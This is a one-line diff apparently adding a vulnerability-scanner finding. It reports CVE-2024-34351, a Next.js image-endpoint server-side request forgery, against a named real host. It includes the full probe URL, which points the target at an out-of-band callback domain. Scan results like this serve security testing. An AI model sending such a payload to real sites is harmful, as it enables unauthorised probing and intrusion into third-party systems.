@@ -1,0 +1,1 @@
+[CVE-2024-34351] [http] [high] https://onboard.fetch.ai/_next/image?w=16&q=10&url=https://d8qg323omj13epvgv0lgbsn8sj441axcd.oast.online
